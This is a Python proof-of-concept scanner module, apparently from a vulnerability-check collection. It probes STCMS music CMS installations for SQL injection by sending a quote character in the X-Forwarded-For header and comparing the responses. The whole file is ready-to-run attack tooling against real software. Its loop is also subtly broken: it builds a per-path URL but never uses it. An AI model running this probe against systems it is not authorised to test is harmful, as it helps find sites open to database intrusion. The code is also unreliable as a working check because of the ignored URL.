# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'STCMS_0001'  # 平台漏洞编号，留空
    name = 'STCMS SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-03-02'  # 漏洞公布时间
    desc = '''
        STCMS音乐系统是一个优秀的音乐内容管理系统，本系统基于PHP+Mysql，采用MVC模式开发，支持模板标签，调用灵活。
        参数过滤不严，导致注入。
        /music_rl/
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=97659'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'STCMS'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '70b93688-2d9c-4208-b428-13d8a11133a2'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-07'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # __Refer:WooYun-2015-97659
            hh = hackhttp.hackhttp()
            header = [
                "X-Forwarded-For:1",
                "X-Forwarded-For:1'",
            ]
            uris = ('/music_rl/', '')
            for uri in uris:
                verify_url = self.target + uri
                code, head, body, errcode, _url = hh.http(
                    self.target, header=header[0])
                code1, head1, body1, errcode1, _url1 = hh.http(
                    self.target, header=header[1])

                if code == 200 and 'login' in body and code1 == 200 and 'login' not in body1:
                    #security_hole("X-Forwarded-For SQLI:"+target)
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
